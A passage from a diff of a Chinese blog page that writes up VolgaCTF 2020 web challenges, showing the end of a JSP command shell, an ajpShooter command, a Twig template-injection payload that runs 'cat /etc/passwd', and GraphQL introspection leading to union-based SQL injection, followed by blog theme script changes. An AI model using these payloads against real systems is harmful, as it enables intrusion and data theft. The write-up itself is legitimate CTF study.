+  out.println(disr); 
+  disr = dis.readLine(); 
+}
+%&gt;</code></pre>
 <p>执行<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /uploads/78e1e40f057500a0dd0209effb7514d3 eval</code><br><img src="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>注意到flag.txt的存在,那么直解更改命令上传后再次执行即可</p>
 <p><img src="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-7dbd05ad51c85743.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h2><p>这题网上找不到免费的能收邮件的服务器，应该是要个SMTP的。没办法只能学学Twig打ssti的用法了。<br>题目首先给出看源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mailer</span>\<span class="title">MailerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Mime</span>\<span class="title">Email</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">subscribe</span><span class="params">(Request $request, MailerInterface $mailer)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $msg = <span class="string">''</span>;</span><br><span class="line">      $email = filter_var($request-&gt;request-&gt;get(<span class="string">'email'</span>, <span class="string">''</span>), FILTER_VALIDATE_EMAIL);</span><br><span class="line">      <span class="keyword">if</span>($email !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        $name = substr($email, <span class="number">0</span>, strpos($email, <span class="string">'@'</span>));</span><br><span class="line"></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;get(<span class="string">'twig'</span>)-&gt;createTemplate(</span><br><span class="line">          <span class="string">"&lt;p&gt;Hello $&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;"</span></span><br><span class="line">        )-&gt;render();</span><br><span class="line"></span><br><span class="line">        $mail = (<span class="keyword">new</span> Email())-&gt;from(<span class="string">'newsletter@newsletter.q.2020.volgactf.ru'</span>)-&gt;to($email)-&gt;subject(<span class="string">'VolgaCTF Newsletter'</span>)-&gt;html($content);</span><br><span class="line">        $mailer-&gt;send($mail);</span><br><span class="line"></span><br><span class="line">        $msg = <span class="string">'Success'</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'Invalid email'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'main.twig'</span>, [<span class="string">'msg'</span> =&gt; $msg]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">'&lt;pre&gt;'</span>.htmlspecialchars(file_get_contents(<span class="keyword">__FILE__</span>)).<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace App\Controller;
+
+use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+use Symfony\Component\HttpFoundation\Response;
+use Symfony\Component\HttpFoundation\Request;
+use Symfony\Component\Mailer\MailerInterface;
+use Symfony\Component\Mime\Email;
+
+class MainController extends AbstractController
+{
+    public function index(Request $request)
+    {
+      return $this-&gt;render(&#39;main.twig&#39;);
+    }
+
+    public function subscribe(Request $request, MailerInterface $mailer)
+    {
+      $msg = &#39;&#39;;
+      $email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);
+      if($email !== FALSE) {
+        $name = substr($email, 0, strpos($email, &#39;@&#39;));
+
+        $content = $this-&gt;get(&#39;twig&#39;)-&gt;createTemplate(
+          &quot;&lt;p&gt;Hello ${name}.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;&quot;
+        )-&gt;render();
+
+        $mail = (new Email())-&gt;from(&#39;newsletter@newsletter.q.2020.volgactf.ru&#39;)-&gt;to($email)-&gt;subject(&#39;VolgaCTF Newsletter&#39;)-&gt;html($content);
+        $mailer-&gt;send($mail);
+
+        $msg = &#39;Success&#39;;
+      } else {
+        $msg = &#39;Invalid email&#39;;
+      }
+      return $this-&gt;render(&#39;main.twig&#39;, [&#39;msg&#39; =&gt; $msg]);
+    }
+
+
+    public function source()
+    {
+        return new Response(&#39;&lt;pre&gt;&#39;.htmlspecialchars(file_get_contents(__FILE__)).&#39;&lt;/pre&gt;&#39;);
+    }
+}</code></pre>
 <p>首先不用说，<code>${name}</code>这里存在ssti的。同时确认是twig模板的。<br><code>$email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);</code><br>这句过滤很好绕，只需要<code>6@domain.tld</code>就可以在收清求的地方看到ssti的效果了。<br>flag在etc/passwd中<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#123;[&#39;cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;&quot;@y</span><br></pre></td></tr></table></figure>
-<p>因为没法亲自动手所以只好搬运payload了，惭愧…</p>
+<pre><code>&quot;{{['cat${IFS}/etc/passwd']|filter('system')}}&quot;@y</code></pre><p>因为没法亲自动手所以只好搬运payload了，惭愧…</p>
 <h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>在注册时可以抓包发现/api的路由<br><img src="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-7730cfea600e9d6a.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>根据传输及返回形式，可以判断出是GrpahQL的api接口,同时也有个经典的利用，就是传<code>{__schema{types{name}}}</code>,可以通过__schema查询所有可用对象：<br>尝试直接访问无果，post传值<code>{&quot;query&quot;:&quot;{ __schema { types { name } } }&quot;}</code><br>(这里要稍微根据之前传值的方式构造一下)</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"data"</span>:&#123;<span class="attr">"__schema"</span>:&#123;<span class="attr">"types"</span>:[&#123;<span class="attr">"name"</span>:<span class="string">"Query"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"LoginUser"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"LoginResponse"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"UserFilter"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"User"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Book"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Mutation"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"RegisterUser"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Schema"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Type"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__TypeKind"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"Boolean"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Field"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__InputValue"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__EnumValue"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__Directive"</span>&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"__DirectiveLocation"</span>&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="json">{&quot;data&quot;:{&quot;__schema&quot;:{&quot;types&quot;:[{&quot;name&quot;:&quot;Query&quot;},{&quot;name&quot;:&quot;String&quot;},{&quot;name&quot;:&quot;LoginUser&quot;},{&quot;name&quot;:&quot;LoginResponse&quot;},{&quot;name&quot;:&quot;UserFilter&quot;},{&quot;name&quot;:&quot;User&quot;},{&quot;name&quot;:&quot;Book&quot;},{&quot;name&quot;:&quot;Mutation&quot;},{&quot;name&quot;:&quot;RegisterUser&quot;},{&quot;name&quot;:&quot;__Schema&quot;},{&quot;name&quot;:&quot;__Type&quot;},{&quot;name&quot;:&quot;__TypeKind&quot;},{&quot;name&quot;:&quot;Boolean&quot;},{&quot;name&quot;:&quot;__Field&quot;},{&quot;name&quot;:&quot;__InputValue&quot;},{&quot;name&quot;:&quot;__EnumValue&quot;},{&quot;name&quot;:&quot;__Directive&quot;},{&quot;name&quot;:&quot;__DirectiveLocation&quot;}]}}}</code></pre>
 <p>使用如下payload可以一个个的爆出我们可能可以利用的schema的信息<br><code>{&quot;query&quot;:&quot;{ __type(name: \&quot;User\&quot;) { name fields { name type { name kind }}}}&quot;}</code></p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"data"</span>:&#123;<span class="attr">"__type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"User"</span>,<span class="attr">"fields"</span>:[&#123;<span class="attr">"name"</span>:<span class="string">"login"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"name"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;,&#123;<span class="attr">"name"</span>:<span class="string">"email"</span>,<span class="attr">"type"</span>:&#123;<span class="attr">"name"</span>:<span class="string">"String"</span>,<span class="attr">"kind"</span>:<span class="string">"SCALAR"</span>&#125;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="json">{&quot;data&quot;:{&quot;__type&quot;:{&quot;name&quot;:&quot;User&quot;,&quot;fields&quot;:[{&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}},{&quot;name&quot;:&quot;name&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}},{&quot;name&quot;:&quot;email&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}}]}}}</code></pre>
 <p>这就告诉我们，User object有三个Field.login, name ,email.同理我们爆下其他的,比如重点关注的Query<br>回显：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;__type&quot;:&#123;&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[&#123;&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现一个testGetUsersByFilter,似乎很有意思。也许它对可注的点进行了过滤,但这就意味着我们可以进行注入。<br>于是我们进行基本的查询。此时目标应该是sql注入，寻找可注点。</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"query"</span>:<span class="string">"query testGetUsersByFilter($input: UserFilter) &#123;\n  testGetUsersByFilter(filter: $input) &#123;\n  login email name \n  &#125;\n&#125;\n"</span>,<span class="attr">"variables"</span>:&#123;<span class="attr">"input"</span>:&#123;<span class="attr">"login"</span>:<span class="string">"test"</span>,<span class="attr">"email"</span>:<span class="string">"test"</span>,<span class="attr">"name"</span>:<span class="string">"test"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>{&quot;data&quot;:{&quot;__type&quot;:{&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[{&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;}},{&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:{&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;}},{&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:{&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;}},{&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:{&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;}}]}}}</code></pre><p>发现一个testGetUsersByFilter,似乎很有意思。也许它对可注的点进行了过滤,但这就意味着我们可以进行注入。<br>于是我们进行基本的查询。此时目标应该是sql注入，寻找可注点。</p>
+<pre><code class="json">{&quot;query&quot;:&quot;query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n  login email name \n  }\n}\n&quot;,&quot;variables&quot;:{&quot;input&quot;:{&quot;login&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test&quot;,&quot;name&quot;:&quot;test&quot;}}}</code></pre>
 <p>构造这样一个查询语句。此时我们需要通过控制login email,name的值来测试是否存在注入</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"query"</span>:<span class="string">"query testGetUsersByFilter($input: UserFilter) &#123;\n  testGetUsersByFilter(filter: $input) &#123;\n  login email name \n  &#125;\n&#125;\n"</span>,<span class="attr">"variables"</span>:&#123;<span class="attr">"input"</span>:&#123;<span class="attr">"login"</span>:<span class="string">"'"</span>,<span class="attr">"email"</span>:<span class="string">"1231321"</span>,<span class="attr">"name"</span>:<span class="string">"3213"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="json">{&quot;query&quot;:&quot;query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n  login email name \n  }\n}\n&quot;,&quot;variables&quot;:{&quot;input&quot;:{&quot;login&quot;:&quot;&#39;&quot;,&quot;email&quot;:&quot;1231321&quot;,&quot;name&quot;:&quot;3213&quot;}}}</code></pre>
 <p>当尝试sql注入常见的单引号时，发现返回的结果对应的login居然是空的。所以看来单引号被过滤了。但这并不是什么问题。因为逃逸单引号也是个考烂的trick了。</p>
 <p>将我们传参部分input的值改为：<code>{&quot;login&quot;:&quot;test\\&quot;,&quot;name&quot;:&quot; union select * from users -- &quot;}</code><br>发现将返回所有用户名。至此sql注入已经确认可注，接下来就是挖掘信息了。<br>先order by 测字段数，发现是6个<br><img src="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-5d9034306364e75c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>然后执行查询，发现回显字段是2,6,5<br><code>union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()#</code><br>发现flag表,flag列，查询即可<br><img src="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-b852135e54ac4de8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
@@ -708,7 +945,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -720,9 +957,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -855,6 +1092,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1068,7 +1307,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1124,6 +1363,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
